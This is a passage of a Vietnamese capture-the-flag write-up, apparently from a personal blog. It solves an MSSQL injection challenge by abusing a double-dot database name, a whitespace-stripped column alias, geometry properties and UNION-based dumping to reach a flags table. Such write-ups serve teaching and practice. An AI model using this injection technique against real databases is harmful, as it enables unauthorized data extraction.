<img src=https://hackmd.io/_uploads/BJwir9igkl.png loading=lazy alt=image><br><img src=https://hackmd.io/_uploads/SJFnScjekl.png loading=lazy alt=image><br></p><p>Từ đó thì mình thấy payload đang được truyền vào nhiều hơn 1 chỗ trong câu lệnh SQL, nôm na câu lệnh SQL sẽ dạng dạng như này (mình đoán vậy):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>payload</span><span class=o>.*</span> <span class=n>FROM</span> <span class=n>OldHeroDB</span><span class=o>..</span><span class=n>payload</span> <span class=n>WHERE</span> <span class=n>OldHeroDB</span><span class=o>..</span><span class=n>payload</span><span class=o>.</span><span class=n>Id</span> <span class=o>=</span> <span class=mi>1</span>
</span></span></code></pre></td></tr></table></div></div><p>Mình đã cố thử stacked query hoặc declare thêm biến để chạy xp_cmdshell vào phần WHERE cuối nhưng làm như vậy sẽ lỗi ở phần payload trên, kết quả đều không giòn
Đi tìm kiếm các tài liệu về mssql injection, mình tìm thấy một blog khai thác với cái kiểu db với 2 dấu chấm đằng sau rất giống với challenge: <a class=link href=https://cyku.tw/no-database-mssql-injection/ target=_blank rel=noopener>https://cyku.tw/no-database-mssql-injection/</a>
Từ blog trên mình rút ra được vài thứ:</p><ul><li>Không thể stacked query</li><li>Thực chất không có database nào có tên là OldHeroDB cả</li><li>MSSQL sẽ loại bỏ các dấu cách trong quá trình xử lý tên cột -> có thể tạo tên cột với giá trị null nếu như truyền gán vào nó giá trị của subquery <code>select 1 as [ ]</code>
<img src=https://hackmd.io/_uploads/HJs1h9jxyg.png loading=lazy alt=image><br></li></ul><p>Như vậy, ta đã có thể craft thành payload SQL Injection, để tránh gặp lỗi call methods on int ta sẽ dùng các properties và objects có sẵn trong MSSQL, mà trong blogs sử dụng là STY của data type <code>geometry</code> -> trả về kiểu float
<img src=https://hackmd.io/_uploads/B1-025jl1x.png loading=lazy alt=image><br>Từ response của server, ta có được 3 cột của bảng là id, hero_name và hero_power. Đặc biệt trong đó cột hero_name có thể chứa chuỗi.
Theo blog thì payload có thể attack kiểu Union based nên mình cũng nhóm thêm union select và kết quả show ra thông tin, tiện cho mình để dump db:<br><img src=https://hackmd.io/_uploads/B1at69jxkg.png loading=lazy alt=image><br><img src=https://hackmd.io/_uploads/rkUyyjslyx.png loading=lazy alt=image><br>Công việc gần như đã xong, giờ mình sẽ đi mò xem flag ở đâu, nếu như không cho dùng xp_cmdshell để RCE thì chắc flag sẽ nằm ở 1 bảng nào đó.
Xác định được bảng <code>flags</code>:
<img src=https://hackmd.io/_uploads/BJ-mksolJe.png loading=lazy alt=image><br>Xác định cột của bảng <code>flags</code> là <code>flag_value</code>:
<img src=https://hackmd.io/_uploads/BkoEkjjgkx.png loading=lazy alt=image><br>Solve :heavy_check_mark:
<img src=https://hackmd.io/_uploads/ByNLyojx1g.png loading=lazy alt=image><br></p><ul><li>Flag: <code>ISITDTU{R3g4in_m0t1vation_w1th_s1mpl3_SQL1}</code></li></ul></section><footer class=article-footer><section class=article-tags><a href=/tags/ctf/>CTF</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2026 kev1n's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>